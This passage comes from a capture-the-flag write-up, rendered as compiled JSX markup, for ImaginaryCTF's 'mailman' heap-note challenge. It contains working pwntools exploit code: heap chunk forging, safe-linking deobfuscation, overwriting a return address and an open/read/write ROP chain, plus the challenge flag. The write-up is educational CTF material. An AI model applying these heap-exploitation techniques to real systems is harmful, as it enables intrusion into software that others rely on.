\",(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e621c2\"}),\" __isoc99_scanf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"178\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x559d76869498\"}),\" main\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"375\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So, what we\\u2019re instead going to do is find the offset of \",(0,n.jsx)(e.code,{children:\"_IO_file_underflow\"}),\" return pointer, and forge a chunk to write there. We can reuse the chunks we made from our last arbitrary write, which simplifies things. The offset was computed via some trial and error, but the important feature is that it must be 16 byte aligned, otherwise malloc will crash when trying to alloc from the stack address.\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x258\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# offset computed in gdb\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our forged chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# write to our forged chunk (which again contains the metadata to victim)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# alloc our victim chunk again.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'xxx'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# write padding and ROP chain\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'A'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc8\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As a final step, let\\u2019s discuss the ROP chain. Seccomp prevents us from calling \",(0,n.jsx)(e.code,{children:\"system\"}),\" or \",(0,n.jsx)(e.code,{children:\"execve\"}),\", so we need to use \",(0,n.jsx)(e.code,{children:\"open\"}),\", \",(0,n.jsx)(e.code,{children:\"read\"}),\", and \",(0,n.jsx)(e.code,{children:\"write\"}),\" to output the flag. The first step is find what can setup these syscalls, luckilly, libc gives us the great function \",(0,n.jsx)(e.code,{children:\"syscall()\"}),\" which we can keep returning to to call these three functions. Next, I need to open \",(0,n.jsx)(e.code,{children:\"flag.txt\"}),\". This is not a complicated problem at all. Remember that 16 byte buffer I allocated during the botcake exploit to prevent consolidation? I can find the fixed offset of that chunk, and write \",(0,n.jsx)(e.code,{children:\"'flag.txt\\\\0'\"}),\" to it, and use that as my buffer for open. Then calling read and write becomes simple register operations.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"pwntools is extremely useful in automating this process.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ROP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"flagoffset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5f520\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5c000\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" flagoffset\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"output \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"syscall \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"171444\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Flag.txt: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# open('flag.txt',0,0)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#read(3, buf, 0x100)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#write(1, buf, 0x100)\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can run the entire script and it prints out the flag on remote: \",(0,n.jsx)(e.code,{children:\"ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}\"})]}),`\n`,(0,n.jsxs)(e.h2,{id:\"tldr-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#tldr-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"TLDR \",(0,n.jsx)(\"a\",{name:\"tldr\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Heap Note Challenge with no update, arbitrary chunk size, with glibc2.35, full protections, OWR seccomp, no return, no \",(0,n.jsx)(e.code,{children:\"exit()\"}),\". Use double free and read after free to leak libc and heap, use House of Botcake to do FSOP on stdout to leak environ and get a stack leak. Write over return address of \",(0,n.jsx)(e.code,{children:\"_IO_file_underflow\"}),\" during the read call of a note allocation to ROP to Open, Read, Write chain to get flag.\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"full-script-annotated-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#full-script-annotated-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Full Script (Annotated) \",(0,n.jsx)(\"a\",{name:\"script\"})]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#!/usr/bin/env python3\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./vuln_patched\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./libc.so.6\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` exe\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# this makes tmux split vertically when debugging\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"terminal \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tmux'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'splitw'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'-f'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'-h'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# I was going to beat safelinking another way, which is why this became a global\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# pwninit\\u2019s stub conn() function. Call with `python3 solve.py LOCAL` or no args to change which.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"conn\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"LOCAL\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" process\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"path\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" remote\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"mailman.chal.imaginaryctf.org\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1337\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` r\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Safelinking deobfuscation helper\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"deobfuscate\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"val\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfff\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"52\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" mask\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),` mask\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` val\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"main\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"global\"}),` heap\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"alloc\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"ALLOCATING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"> \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"1\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"size: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"content: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"FREEING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"> \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"2\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token 